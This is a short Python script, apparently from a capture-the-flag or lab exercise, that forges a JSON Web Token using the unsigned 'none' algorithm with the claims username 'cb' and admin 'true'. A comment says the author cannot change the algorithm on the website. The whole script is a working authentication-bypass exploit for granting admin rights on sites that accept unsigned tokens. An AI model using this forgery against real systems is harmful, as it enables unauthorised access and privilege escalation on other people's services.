import jwt
#need to do this here as i cant change algorithm on website.
encoded = jwt.encode({'username':'cb','admin':'true'},'',algorithm='none')
print(encoded)